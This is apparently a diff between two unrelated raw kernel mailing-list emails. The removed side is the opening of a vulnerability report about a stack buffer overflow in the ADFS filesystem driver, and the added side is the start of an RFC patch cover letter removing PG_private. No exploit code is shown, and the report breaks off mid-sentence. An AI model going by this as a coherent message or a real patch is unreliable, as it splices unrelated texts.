@@ -1,809 +1,379 @@
-Received: from mail-ot1-f51.google.com (mail-ot1-f51.google.com [209.85.210.51])
-	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
+Received: from BN8PR05CU002.outbound.protection.outlook.com (mail-eastus2azon11011002.outbound.protection.outlook.com [52.101.57.2])
+	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 5DC60302163
-	for <linux-fsdevel@vger.kernel.org>; Sat,  1 Aug 2026 02:15:47 +0000 (UTC)
-Authentication-Results: smtp.subspace.kernel.org; arc=pass smtp.client-ip=209.85.210.51
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 9F45E3ACF0F;
+	Sat,  1 Aug 2026 02:17:04 +0000 (UTC)
+Authentication-Results: smtp.subspace.kernel.org; arc=fail smtp.client-ip=52.101.57.2
 ARC-Seal:i=2; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
-	t=1785550550; cv=pass; b=MkKjKcsEeVyitGtNyDfBP+2P6FqulBr4IWZ9NUEcVy2nYomKCDI0ZdSKqdudSQ6fbyRZPVFxk37ZqIPx3HAm+8Cm4+kO6f3kLPdStoD881meMjNygKqjYgFgOBHDNn6NSBHRJwfd5xPiJFPngHI9m/xpGDSqXBf+d/vxf8TAeK8=
+	t=1785550626; cv=fail; b=gdk5HtQrKKbcaKM6vNQWUv3D7Kc8yKJX3FoqlzhTHwhuYHc4t8YQaW/KM5/k5rACUepntFUSBZCJ78l3SUWhgDWhJf8vT6zIxc/+RPZH2pOwn7tUIacHgGFyGH6TlmRZmYdqM5NFUAJv4CyntQkap+N3Xnid5lsYd7mlLZgL5X4=
 ARC-Message-Signature:i=2; a=rsa-sha256; d=subspace.kernel.org;
-	s=arc-20240116; t=1785550550; c=relaxed/simple;
-	bh=HWvYVqOtijXtHKB5ryYT84H/hlCTENzrJBafrdtmDL4=;
-	h=MIME-Version:From:Date:Message-ID:Subject:To:Cc:Content-Type; b=FkjihH2gpseutcEwB1ExqJ+QTQ2VPagu8x8FHs4neplsXnWgwscJDau3sgSGs+9W4cSlxM7SkkzWNRFWfPzxWzHmqSNg3CfGzt8RfALtsYYdfDwksxbz3MEmWLu8wLU7VOapgY6X6maJUxy/6ZCB0szjxMYvIKMff3ceSY6vpF4=
-ARC-Authentication-Results:i=2; smtp.subspace.kernel.org; dmarc=none (p=none dis=none) header.from=zerotracelab.com; spf=pass smtp.mailfrom=zerotracelab.com; dkim=pass (2048-bit key) header.d=zerotracelab-com.20251104.gappssmtp.com header.i=@zerotracelab-com.20251104.gappssmtp.com header.b=dzqTSbiX; arc=pass smtp.client-ip=209.85.210.51
-Authentication-Results: smtp.subspace.kernel.org; dmarc=none (p=none dis=none) header.from=zerotracelab.com
-Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=zerotracelab.com
+	s=arc-20240116; t=1785550626; c=relaxed/simple;
+	bh=sC1FvhFhnE95FDcTTbwJDopZgy6VV3OmPtThvPD4g7A=;
+	h=From:Subject:Date:Message-Id:Content-Type:To:Cc:MIME-Version; b=L6k5/ki6qY89LCKQ8fsmld4kKvJxj+/U+Hz9pJQtKdpLyYut2OiTtMXgMv3ekO2pZTg1wE+smPu/kwUVdmfafNmwD8ejf5ZL0vu9s1rHx+dLknvWsJsHjm+pBk8c9MD7EbB9nIH9qU3nqkgtrb+1IFv/u707EVi4JPF4TrUzQ+E=
+ARC-Authentication-Results:i=2; smtp.subspace.kernel.org; dmarc=pass (p=reject dis=none) header.from=nvidia.com; spf=fail smtp.mailfrom=nvidia.com; dkim=pass (2048-bit key) header.d=Nvidia.com header.i=@Nvidia.com header.b=FB5Uzv+j; arc=fail smtp.client-ip=52.101.57.2
+Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=reject dis=none) header.from=nvidia.com
+Authentication-Results: smtp.subspace.kernel.org; spf=fail smtp.mailfrom=nvidia.com
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (2048-bit key) header.d=zerotracelab-com.20251104.gappssmtp.com header.i=@zerotracelab-com.20251104.gappssmtp.com header.b="dzqTSbiX"
-Received: by mail-ot1-f51.google.com with SMTP id 46e09a7af769-7e9d7464b71so766433a34.0
-        for <linux-fsdevel@vger.kernel.org>; Fri, 31 Jul 2026 19:15:47 -0700 (PDT)
-ARC-Seal: i=1; a=rsa-sha256; t=1785550546; cv=none;
-        d=google.com; s=arc-20260327;
-        b=YXoXR2i68DToLx0oAbx0L6KlwpDGx/DE65jIH1SZE1arWhxx+tYaryBG/dVL+TAn1q
-         tPb7nZtaayA5mBUPNRMTA3ZAqlUyGW39AO/TcGBImGJie8fq1/KDKm3R2wqCt3KghTLs
-         Lu6YBwvqYPsacEFCzVbOcaoMKjfMjCUoWerAM9Oi0JbLDuvCeQW5xWfaC525WBU1so+C
-         CSrfvQ6sLwfJpHY6eEHNJLzLmtnzbDL0L5/8m9JTVJOu8DknFIY1Q6Cf7v1DrzEpU53P
-         YiphiM4LioDfkcxq3ewGijDE3mm6T9hZ/9ef+MWbb0mWIBNniMHJp4+LyIM3p+vrWbEf
-         CPvQ==
-ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=google.com; s=arc-20260327;
-        h=cc:to:subject:message-id:date:from:mime-version:dkim-signature;
-        bh=MQzgt55M/+pKI4cZq2xrOa5CKn0QYw5GC6WFz76+6aU=;
-        fh=S/KIHUDI/zKVsLFQHB7cOpzlU4XWa4bARjWLBOEkIvg=;
-        b=iC+w5vvlUH5ksipcjIF62HE21OrhtAuhapPKDDZaSm63YcbteEOWFQ7L7x7Ym2Mwz4
-         r1+VsnZIUO6nUHIOqqteHI2kC9+MCZvxaVaBKuEVaZICgJ1+oHeu8ilPkDWxYXXCrnRE
-         VqeXs2xjkEAcuiRld4ASXYeSG4ah3IBmZ7/NBDIngiCfWhK9hlzwyMbYsqKGU4RCxViE
-         CDVrGQUHCOrgKN8AWT8wOxbFUBCT/vID7n332oArSyi1YTZCqKh9oju8mqT2pi855MTa
-         6ALSfFfFVstjmDJXR7jBgKu1gSOwdq7mjjGn0pm8Nw9K0zf6igzbNDj1UOgLTrFsU8pY
-         agrA==;
-        darn=vger.kernel.org
-ARC-Authentication-Results: i=1; mx.google.com; arc=none
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=zerotracelab-com.20251104.gappssmtp.com; s=20251104; t=1785550546; x=1786155346; darn=vger.kernel.org;
-        h=content-type:cc:to:subject:message-id:date:from:mime-version:from
-         :to:cc:subject:date:message-id:reply-to:content-type;
-        bh=MQzgt55M/+pKI4cZq2xrOa5CKn0QYw5GC6WFz76+6aU=;
-        b=dzqTSbiXnf/TuPiJOkwu5Evc9L4jJXDHQuZned05goWuVLuMFfUDd02V3w47/61jTo
-         C/3TSdcPTR3n/XJb8pNE3KAykRcGZgGvULhZ1RGob6lJvH3IGRgYTHHt+pZqWii0bX+j
-         DMEMxKrnBiwym3huA1ETd5DaJxexZZjukb2vpfjX40Nt72CeP9cDWCUcK0Rq1KaYuSyM
-         TMCum4XTNXsKGsGDsL11gbg0y0ws5lT2hAOJL+mwKz0NLOuTjkM7aqVSrt4d85gX8Nbo
-         KE8YEybWfHSjIhxJZ+xcDjmm+8XVGJAnBsRZ7rD9lSkJWl1SXP5afMH6SiW4xeHgkNdM
-         TjQg==
-X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20251104; t=1785550546; x=1786155346;
-        h=content-type:cc:to:subject:message-id:date:from:mime-version
-         :x-gm-gg:x-gm-message-state:from:to:cc:subject:date:message-id
-         :reply-to:content-type;
-        bh=MQzgt55M/+pKI4cZq2xrOa5CKn0QYw5GC6WFz76+6aU=;
-        b=phR8PX/3dqlchWiPlHZVFRsSRAghgl57wZFAj06CiB0pfABDaAK6cFWBxLrlvw5if3
-         8QzugkF5wHNPoRgMoc1ZfPR9oRFBAfBNB9HBUAXh8u7pLhTA/d5WYXcq3BGB3+iS3OcB
-         rgzdtxUlRAW/L2iCTSmpwuJkyX/M4RzrYvzrU581Mj+31Lp0pRfDZFDXJ7gqg6YWRflq
-         k8bdFZDRA7lzbeq0Db9XWlI4WcfJXFwVBu+9txiz6Noz39OXz/YqVbXnK1oL+1Fwwy0M
-         Ki0ORR3CdC+sobpht7X5z3I6AJ+FXfLqDUPvYL/irgwiwaSww86w0cQkZyD6uoUSkaIK
-         6mIg==
-X-Gm-Message-State: AOJu0YyYWapSGkUrZG/8MvQxv8HusYuNObME4Q2uKJAtiQJDvgZlHD3x
-	9nkyI5EqHHuUJxe3QPOpVhFHKD0Zv2mqOGcvDM1QFwXay/nU7Qd8QipJups9g6L9Z1YGJkEkoP0
-	cXBtDENLyD86rzJAzsCOmq2OW+tQcQ0XeZwGA64OZ3Wo=
-X-Gm-Gg: AR+sD12J7p+h/JMAB05Quiexqz4Z5rxiM3gm1xvn/blelbDVclQll6m0c1FQrCmrTxT
-	ySYItCWyAUW4mw73MADqMjA2zJyHMi+hUMGLaHlBB+zy+MoRyuoPeJAA5z3wPChhUb5eZQfvcIj
-	Ut2NM9ySvzMygwH+6FFeH0g1HZ5dJv6twgS4Ojdq948T1Rv+UJmFn6iuk9zh1n7hhqkCTQGNM8Q
-	5W0ek/A0E+xEWVI4zzogUjri1ddxZ/6oe7mlR3naa64sbP6RjO2lQpNfGhg5vfYjiCmqp3xAfoX
-	vcAg7OmEVJ/DhkpN6dittlPzUgaeHig8IuGk4z8jL4eROiw=
-X-Received: by 2002:a05:6808:2289:b0:497:df42:1e04 with SMTP id
- 5614622812f47-4af5e2a0104mr4545674b6e.18.1785550545937; Fri, 31 Jul 2026
- 19:15:45 -0700 (PDT)
+	dkim=pass (2048-bit key) header.d=Nvidia.com header.i=@Nvidia.com header.b="FB5Uzv+j"
+ARC-Seal: i=1; a=rsa-sha256; s=arcselector10001; d=microsoft.com; cv=none;
+ b=juOG2d/steEklncNOvTy2HvMCzBRsBGtDaBigF+Zw99wCtxthKH9xaGYT9qWEVMP8Q76Iov7fdZDUGjwHlvM66fNmEIIPjId1D7gZZLIViWJAtaPlxuhcb7/aCtyiXWtwjSDdkuhSj4uxmaU6voqSMzVv+wLCaZdEpm1UniIM6XXr/y08d3cNmlDzA37/s+JyM+lKktnI+pPDcw4LcroYMhMWSlFXabL9JX7qqq2G9GkbyzxNZZdBfDXhiVcwodCDaUwfV4RLlUop1Vjl3p2ixOvETBfmnPpPYyDCHPwUZ6z8D4R4UBbp3gbajUber9EYwmfNycR/9reTyem8JAXug==
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=microsoft.com;
+ s=arcselector10001;
+ h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-AntiSpam-MessageData-ChunkCount:X-MS-Exchange-AntiSpam-MessageData-0:X-MS-Exchange-AntiSpam-MessageData-1;
+ bh=1Dj2NYUyQZvuonVfcvoKoW2H3adtSVWranxYgEi8YQU=;
+ b=nS22Y21LUCkU9rE1tarBHVVoAOS6WoqXifPtaQIE8OYP/CiU7e1kuVgaMB8YfpBfwoWAzik518UdioQWoZmjgtRvCkiZoV18o6PNnRTVj6ggOgtj6OEdb9s9LF2yhoqyLMGg1EJ5eSVv4eBT1+JcD+3kJZrBt9FU0cKgRk9BBrqrjgM5c0KkO59dyK/lRP96h2SLx1wu57lFNzyM/iAKasNf3twQFbmJao0qMCbFWmBjeHqehUINFK536hvgVac4mYp2NrOIMZcRh5B4mo81JHleaUmUx1urY27cvvzQgM2iZgZQWkKx38i1rxQ8hux3PaeLK5OtUsv35myLt1YIAw==
+ARC-Authentication-Results: i=1; mx.microsoft.com 1; spf=pass
+ smtp.mailfrom=nvidia.com; dmarc=pass action=none header.from=nvidia.com;
+ dkim=pass header.d=nvidia.com; arc=none
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=Nvidia.com;
+ s=selector2;
+ h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-SenderADCheck;
+ bh=1Dj2NYUyQZvuonVfcvoKoW2H3adtSVWranxYgEi8YQU=;
+ b=FB5Uzv+jjIOz2Gqd5kNRUmj0oMIAGc13ZaO7PxN87N2Vsm1h2AmI6UBCGxbiU8v7rBmpSk66cpyjk9doS0l2Cwug3L6tWxa7EnpwkUAI8obSHPvyEZtRmsQRP4Ad/qzEarvlDy1s6rnXeWJmaBg7+kXQP80MMmTUTKKx60Kkrzh78dZdHaCQVnN4Ent82GUKgm+hwh7r8TitUV618trGITHpcjPjn9zyBwtkgbG20BWoOZwi5n1SC1ZzVLkEqAMp7SKzKMlAu2o6c8XmMv0HO0zTS1DVdv1s4GB47p2UxxkBgmCmVu6y6Mvahl6HousWTQ32VDFXU9udlm0xGrD9Mg==
+Authentication-Results: dkim=none (message not signed)
+ header.d=none;dmarc=none action=none header.from=nvidia.com;
+Received: from IA0PR12MB8374.namprd12.prod.outlook.com (2603:10b6:208:40e::7)
+ by PH8PR12MB7373.namprd12.prod.outlook.com (2603:10b6:510:217::16) with
+ Microsoft SMTP Server (version=TLS1_2,
+ cipher=TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384) id 15.21.270.16; Sat, 1 Aug
+ 2026 02:16:55 +0000
+Received: from IA0PR12MB8374.namprd12.prod.outlook.com
+ ([fe80::d85f:4c87:ae84:3f16]) by IA0PR12MB8374.namprd12.prod.outlook.com
+ ([fe80::d85f:4c87:ae84:3f16%5]) with mapi id 15.21.0270.015; Sat, 1 Aug 2026
+ 02:16:55 +0000
+From: Zi Yan <ziy@nvidia.com>
+Subject: [PATCH RFC 00/14] Remove PG_private by using page/folio->private
+ checks instead
+Date: Fri, 31 Jul 2026 22:13:23 -0400
+Message-Id: <20260731-remove-pg_private-v1-0-142c97ba3562@nvidia.com>
+Content-Type: text/plain; charset="utf-8"
+Content-Transfer-Encoding: 8bit
+X-B4-Tracking: v=1; b=H4sIAENWbWoC/6tWKk4tykwtVrJSqFYqSi3LLM7MzwNyDHUUlJIzE
+ vPSU3UzU4B8JSMDIzMDcyML3aLU3PyyVN2C9PiCosyyxJJU3eS0VEsjs2TzNAvjZCWgvoKi1LT
+ MCrCZ0UpBbs5KsbW1AC4r+oRoAAAA
+X-Change-ID: 20260728-remove-pg_private-cfe926c7f83c
+To: David Hildenbrand <david@kernel.org>, 
+ "Matthew Wilcox (Oracle)" <willy@infradead.org>, 
+ Andrew Morton <akpm@linux-foundation.org>, 
+ Muchun Song <muchun.song@linux.dev>, Lorenzo Stoakes <ljs@kernel.org>, 
+ "Liam R. Howlett" <liam@infradead.org>, Vlastimil Babka <vbabka@kernel.org>, 
+ Mike Rapoport <rppt@kernel.org>, Suren Baghdasaryan <surenb@google.com>, 
+ Michal Hocko <mhocko@suse.com>, Baolin Wang <baolin.wang@linux.alibaba.com>, 
+ Nico Pache <nico.pache@linux.dev>, Ryan Roberts <ryan.roberts@arm.com>, 
+ Dev Jain <dev.jain@arm.com>, Barry Song <baohua@kernel.org>, 
+ Lance Yang <lance.yang@linux.dev>, Usama Arif <usama.arif@linux.dev>, 
+ Gregory Price <gourry@gourry.net>, 
+ Ying Huang <ying.huang@linux.alibaba.com>, 
+ Alistair Popple <apopple@nvidia.com>, Johannes Weiner <hannes@cmpxchg.org>, 
+ Qi Zheng <qi.zheng@linux.dev>, Shakeel Butt <shakeel.butt@linux.dev>, 
+ Kairui Song <kasong@tencent.com>
+Cc: linux-mm@kvack.org, linux-kernel@vger.kernel.org, 
+ Zi Yan <ziy@nvidia.com>, Minchan Kim <minchan@kernel.org>, 
+ Sergey Senozhatsky <senozhatsky@chromium.org>, 
+ Peter Zijlstra <peterz@infradead.org>, Ingo Molnar <mingo@redhat.com>, 
+ Arnaldo Carvalho de Melo <acme@kernel.org>, 
+ Namhyung Kim <namhyung@kernel.org>, Thomas Gleixner <tglx@kernel.org>, 
+ Borislav Petkov <bp@alien8.de>, Dave Hansen <dave.hansen@linux.intel.com>, 
+ x86@kernel.org, Mark Rutland <mark.rutland@arm.com>, 
+ Alexander Shishkin <alexander.shishkin@linux.intel.com>, 
+ Jiri Olsa <jolsa@kernel.org>, Ian Rogers <irogers@google.com>, 
+ Adrian Hunter <adrian.hunter@intel.com>, 
+ James Clark <james.clark@linaro.org>, "H. Peter Anvin" <hpa@zytor.com>, 
+ linux-perf-users@vger.kernel.org, Juergen Gross <jgross@suse.com>, 
+ Stefano Stabellini <sstabellini@kernel.org>, 
+ Oleksandr Tyshchenko <oleksandr_tyshchenko@epam.com>, 
+ xen-devel@lists.xenproject.org, Eric Biggers <ebiggers@kernel.org>, 
+ "Theodore Y. Ts'o" <tytso@mit.edu>, Jaegeuk Kim <jaegeuk@kernel.org>, 
+ linux-fscrypt@vger.kernel.org, Oscar Salvador <osalvador@suse.de>, 
+ Chao Yu <chao@kernel.org>, linux-f2fs-devel@lists.sourceforge.net, 
+ Gao Xiang <xiang@kernel.org>, Jan Kara <jack@suse.cz>, 
+ Yue Hu <zbestahu@gmail.com>, Jeffle Xu <jefflexu@linux.alibaba.com>, 
+ Sandeep Dhavale <dhavale@google.com>, Hongbo Li <hongbohbli@tencent.com>, 
+ Chunhai Guo <guochunhai@vivo.com>, linux-erofs@lists.ozlabs.org, 
+ linux-fsdevel@vger.kernel.org, Steven Rostedt <rostedt@goodmis.org>, 
+ Masami Hiramatsu <mhiramat@kernel.org>, 
+ Mathieu Desnoyers <mathieu.desnoyers@efficios.com>, 
+ Matthew Brost <matthew.brost@intel.com>, 
+ Joshua Hahn <joshua.hahnjy@gmail.com>, Rakie Kim <rakie.kim@sk.com>, 
+ Byungchul Park <byungchul@sk.com>, 
+ Axel Rasmussen <axelrasmussen@google.com>, Yuanchu Xie <yuanchu@google.com>, 
+ Wei Xu <weixugc@google.com>, linux-trace-kernel@vger.kernel.org, 
+ Trond Myklebust <trondmy@kernel.org>, Anna Schumaker <anna@kernel.org>, 
+ linux-nfs@vger.kernel.org, Song Liu <song@kernel.org>, 
+ Yu Kuai <yukuai@fygo.io>, Ilya Dryomov <idryomov@gmail.com>, 
+ Alex Markuze <amarkuze@redhat.com>, Viacheslav Dubeyko <slava@dubeyko.com>, 
+ Li Nan <magiclinan@didiglobal.com>, Xiao Ni <xiao@kernel.org>, 
+ linux-raid@vger.kernel.org, ceph-devel@vger.kernel.org, 
+ Richard Weinberger <richard@nod.at>, Zhihao Cheng <chengzhihao1@huawei.com>, 
+ linux-mtd@lists.infradead.org, Baoquan He <baoquan.he@linux.dev>, 
+ Pasha Tatashin <pasha.tatashin@soleen.com>, 
+ Pratyush Yadav <pratyush@kernel.org>, Jonathan Corbet <corbet@lwn.net>, 
+ Dave Young <ruirui.yang@linux.dev>, Shuah Khan <skhan@linuxfoundation.org>, 
+ kexec@lists.infradead.org, linux-doc@vger.kernel.org
+X-Mailer: b4 0.14.3
+X-ClientProxiedBy: BL1PR13CA0208.namprd13.prod.outlook.com
+ (2603:10b6:208:2be::33) To IA0PR12MB8374.namprd12.prod.outlook.com
+ (2603:10b6:208:40e::7)
 Precedence: bulk
 X-Mailing-List: linux-fsdevel@vger.kernel.org
 List-Id: <linux-fsdevel.vger.kernel.org>
 List-Subscribe: <mailto:linux-fsdevel+subscribe@vger.kernel.org>
 List-Unsubscribe: <mailto:linux-fsdevel+unsubscribe@vger.kernel.org>
 MIME-Version: 1.0
-From: "Research & Development" <research@zerotracelab.com>
-Date: Fri, 31 Jul 2026 22:15:33 -0400
-X-Gm-Features: AUfX_mz3U1gGoSP6Qo14JiMEeWw3Bo8LIw12imq8o735aCTCAhhQWbz26XiospQ
-Message-ID: <CAGpo96PO4DPJJZtRj9vnR-ZzcWwv=oHyfM7i2Ug+A_CjR3z4+A@mail.gmail.com>
-Subject: adfs: stack buffer overflow in adfs_fplus_getnext() (F+ big-directory)
-To: "viro@zeniv.linux.org.uk" <viro@zeniv.linux.org.uk>, brauner@kernel.org
-Cc: linux-fsdevel@vger.kernel.org, security@kernel.org
-Content-Type: multipart/mixed; boundary="0000000000000542c90657f2e235"
+X-MS-PublicTrafficType: Email
+X-MS-TrafficTypeDiagnostic: IA0PR12MB8374:EE_|PH8PR12MB7373:EE_
+X-MS-Office365-Filtering-Correlation-Id: 8049e82e-f2ed-4234-27b6-08deef72f511
+X-MS-Exchange-SenderADCheck: 1
+X-MS-Exchange-AntiSpam-Relay: 0
+X-Microsoft-Antispam:
+	BCL:0;ARA:13230040|7416014|376014|1800799024|23010399003|366016|5023799004|11063799006|56012099006|10067099003|18002099003|3023799007|6133799003|921020;
+X-Microsoft-Antispam-Message-Info:
+	pNDbTnWlggYMSHNy6jsULJFDGtRzmhD27769oJzJU2pngka0LaGEKVpniUoUJ3CQmbg9xv959+2z+JRtqFf67HdU+qB4JaCwRrXHvxitHS4+X0w1LJjCqx7wSOTmTpy3XxuOd9+f8rK/oQHRePQKndJw/6mlHZZMRqE9wjM6o1AKyiS+KOoN9AwCyphX8Vge1MTQ4lDkgWBEWecQpXPpnk0UVsgsZQXPhDQPsCCipKZBMP4VxfsQyzGYHKkCHv+pjywEZE4DEG6l+4rl5dqSNtc7Qp/DQhsoH47boah3/NyuS1fH0f4kWHFAY6G6Uc40wwSbnwNwgs+WyRKk+i8gXQhhXxEgFiKIttIR6DzHA+ZDDvqLRYbRPY4/hfrCcr7v8m7gnFeK1A/TZtrfpXTX8OQHDcrLTPwZSWiqO7CgFcVOlcx6g3XcpK6DY058ctzvMykbyqZaT3/MipYsv6FlMBL6ObuDgleNuUqlH1qFmIrE1zerLMArOoouhPo7b0s2r8t/oX7VceX7KaXz8dR06EcgNpjyds4vn+pl4J9+JGfO801D7wUbLE0kNRfs3NfM96JMpb8PT2+Pv0dezg5+fDtkUnY8TRZh/pSBDuNLl0m7gAChrxtLbAkf1kt7TaGiF4i0NjEzc+x2hdxLFU5P8kIq8nFhZ6pjA5bStDcTp7wi6cPDfsKsUTMx1/68zgx1mYhoWmcx/XO8OqmYGdg28g==
+X-Forefront-Antispam-Report:
+	CIP:255.255.255.255;CTRY:;LANG:en;SCL:1;SRV:;IPV:NLI;SFV:NSPM;H:IA0PR12MB8374.namprd12.prod.outlook.com;PTR:;CAT:NONE;SFS:(13230040)(7416014)(376014)(1800799024)(23010399003)(366016)(5023799004)(11063799006)(56012099006)(10067099003)(18002099003)(3023799007)(6133799003)(921020);DIR:OUT;SFP:1101;
+X-MS-Exchange-AntiSpam-MessageData-ChunkCount: 1
+X-MS-Exchange-AntiSpam-MessageData-0:
+	=?utf-8?B?S0xSZ2tsSUJ1YURzL2lvL2tRdmRuVEFFNFlkQnBtd1dkOG4vbTg2cHFsVnRG?=
+ =?utf-8?B?VFNoYzN2cXdwK3picTlObkZKZGdHYTMxUjNlR0xycFB4WXUycHhxeEhYOHd3?=
+ =?utf-8?B?K0J2Uk9rVk1WUkZOVEFtd2ZwNWdOZ2QxekZNTEphRWh5L2NxRlFZZFlVUXZB?=
+ =?utf-8?B?K3NxZWdPQ0lyVThKaFZBelNPV1EzOVl5VEhQaFZydTRzblRDNDY1U01mQnhD?=
+ =?utf-8?B?NDhiU1dKdE5SWXVoSjkvdDc0dnNUSzdoVjdSQnordHV1Tk0zSFZwaS9EUGto?=
+ =?utf-8?B?aEtpY2ExQzM3T1VTbWEycmdiT1hzSTVFclVkMXg0eWJhWDI5WmhtL1duV0Z2?=
+ =?utf-8?B?SlNBK1lYUCtaVkFtdFdRZ2RuQVZuTGdoVjl4V2xmVTBTRmhZQ2JYUDBORDJH?=
+ =?utf-8?B?QnV2b2RvbnVFRUtOcnZHcTlRQlZMaWtzMXFyWnk5OXpvd1Vib0ZkSUdJZWdP?=
+ =?utf-8?B?UDJ3Y2xwTmtNRVdYR1JJeTgvMXNOTERXcDFRaDBiQlpHOThGTnFQR1RCNnRr?=
+ =?utf-8?B?SHE4M1BFZXBFTW9BbXExQWJYNEZsNTl6WkRtd1NMU08ycU5wRVFnWHlxb05L?=
+ =?utf-8?B?a1pFT2h1VW9BdDlrYnBCNExFdWRTYnNmbVk4UEdaYnJyL0pueVZJczJ1MC85?=
+ =?utf-8?B?RlJhcnRCbkl2SzZuV3ovN01xcjhkcWVNSVJqZHp1akNhUDA2b2Q1YWY5RkNa?=
+ =?utf-8?B?TVpvUG9tSG5mcm0xMG9mTHFwZnVMYjBrdVRleG5UcmlXSVlnWGs5eWQ0Kzll?=
+ =?utf-8?B?RDBSMlFuL3JucEFxeHRGYURTOERQdkxmYWMrWEFLak0xZVZ2RGVqUWZieFBu?=
+ =?utf-8?B?NmhZMk9yci9URFpuaHUwQVpGa2p3VnJFK2pNRjduanF2Lys0Z0JDMTBkblBp?=
+ =?utf-8?B?L3dQd2hhTC9PSkZhY09neFIxWEo1d2Q2UmJQQWdyMkF0aGQwWVprQ1hJTVcv?=
+ =?utf-8?B?RTl0Z25ZM2J5SW8rMkMrblhROS9vZFZNTHIzY1BjKzFlTEZOTGd6ckozVmhY?=
+ =?utf-8?B?YXBPdHVMRjgzNHgra3VibnRFbkdScXNjVkdFQ2pIdVJBRE81OWlsaS9IL01R?=
+ =?utf-8?B?L25MZE92SFBFVFd6TFpEdG4wZ1JlRVdxS2x3WE5JbVViOXFsdU92eVN1TFdE?=
+ =?utf-8?B?ak1UUjRUak5tVVh4MzFqdVpUT3BNbFNVRFBPUDc3d1ZXSlV6Nktoa0RhSjlW?=
+ =?utf-8?B?UDlpRlViYzJaM09aY1lEYjVOOVNpWExmVFo1cFNSaXB3WGRKWlNaUGt1WkVv?=
+ =?utf-8?B?bVp5QTFDM1BHZWZqZGQzbjFRMC8zM1I1Q1VtZWVhZWp5Ull6T2hJMmszTGFl?=
+ =?utf-8?B?eXo5V0RMQWFUVHFMMG1ZQThHVW1nMDVIaEVKOEc5djY0TFIvNEpKVnJPM093?=
+ =?utf-8?B?MHh4NmdhV0dERDZYTE5RdGF6OURVRThnUko4aDBsTmppSVRyb0pMYkV3b05u?=
+ =?utf-8?B?UUVaNkxQNlp0NHRCWkFlVHhiR3hRZDF0RHMvcjFnelhHZU1peEpqYlNyLzlY?=
+ =?utf-8?B?c1VsL1lNbHBEYk12cDkxZHJHM3Q2eS82UnZmT00vY0p2eWlwelRpeXc0cWxM?=
+ =?utf-8?B?cVRpVExMSXdEQk1LUllBQ3RmOW02S0lOWDRqMFhoL2JTSkh0SnFhcGNzZWpC?=
+ =?utf-8?B?eDYwR05Xbmg1WVhybkRrWW1sRTJZM1NENjlUNkM4RzdEWVZBSHN4NlcyRFdP?=
+ =?utf-8?B?UUxDOEVZTXFsQVk1dCtmQ2Z0THZHTlRGdzlwV0FkTU5wdVdzZ3VncFNweEVH?=
+ =?utf-8?B?WHBvSGUwcG5qVU10ZVBGYitrSkc2aUQvdzZaZXFKdzh5SjFHemVMTkhtSEhi?=
+ =?utf-8?B?Slo0ZE9Cdjk4UkdVZ3I5dXhoNzlqdGE3c0xkOFM3clRCSDlnN2puNnFDWlhw?=
+ =?utf-8?B?ZDZyTXNEQXBKdGc2LzhUSzNTVmYvOGZ0WEpxQXptbTA0ME5KWTQ5cHVybGov?=
+ =?utf-8?B?SWNYYnJ3QVJlaW91d3VvMjFEcGl3R0RWemdqM1hYTHAxak5wL1VQeUo0TFdY?=
+ =?utf-8?B?RDdmS3kxSUYwMlBwN01CTmlZMlpvQlg5Mkp0SWxzZTFMY3BrcEpqMHdGZ2Fy?=
+ =?utf-8?B?Y0g3eWE3UlRuUmkrTnVnc29adHdwM3J2V3VrS21NUU92T3dBVHkwcThlbWJh?=
+ =?utf-8?B?UkRmUDYwdy95cVByVklSRHpXenhpdHNORWJKdTNFaFV6WjNsbmZpaFRvM052?=
+ =?utf-8?B?clUzczgvaXVmaWZjamxqNDVqQTRHR2M4MzFUQmN0Z2NkUjVROHJvakFZVlhD?=
+ =?utf-8?B?TWRpYnhlNU5ZMjFXZDFzellUTlloTDMwZE1aTkxWYi8rM0xCbmpuM3JabDVp?=
+ =?utf-8?Q?rIlyagVXs903sFdXgk?=
+X-OriginatorOrg: Nvidia.com
+X-MS-Exchange-CrossTenant-Network-Message-Id: 8049e82e-f2ed-4234-27b6-08deef72f511
+X-MS-Exchange-CrossTenant-AuthSource: IA0PR12MB8374.namprd12.prod.outlook.com
+X-MS-Exchange-CrossTenant-AuthAs: Internal
+X-MS-Exchange-CrossTenant-OriginalArrivalTime: 01 Aug 2026 02:16:55.1454
+ (UTC)
+X-MS-Exchange-CrossTenant-FromEntityHeader: Hosted
+X-MS-Exchange-CrossTenant-Id: 43083d15-7273-40c1-b7db-39efd9ccc17a
+X-MS-Exchange-CrossTenant-MailboxType: HOSTED
+X-MS-Exchange-CrossTenant-UserPrincipalName: dHRY+Bi+1YHiBNSqzAr7tvYfQ+7uKeAf5TdP84c5qEpoH6FkhhVKrN9emBFarEQs
+X-MS-Exchange-Transport-CrossTenantHeadersStamped: PH8PR12MB7373
 
---0000000000000542c90657f2e235
-Content-Type: multipart/alternative; boundary="0000000000000542c80657f2e233"
+Hi all,
 
---0000000000000542c80657f2e233
-Content-Type: text/plain; charset="UTF-8"
+This patchset removes PG_private to make space for upcoming PG_folio
+(reserved as __PG_folio) for identifying pages from a folio (more details
+in Note below). Instead of checking PG_private, all code is changed to
+check page/folio->private != NULL instead.
 
-Hi Security Team,
+MM people are cc'd on all patches and subsystem people are cc'd on the
+cover letter and corresponding patches.
 
-I am reporting a security vulnerability in the ADFS filesystem driver
-(fs/adfs/dir_fplus.c), which is maintained under the FILESYSTEMS (VFS)
-entry. It is unfixed in mainline (v7.2-rc5) and, as far as I can tell, in
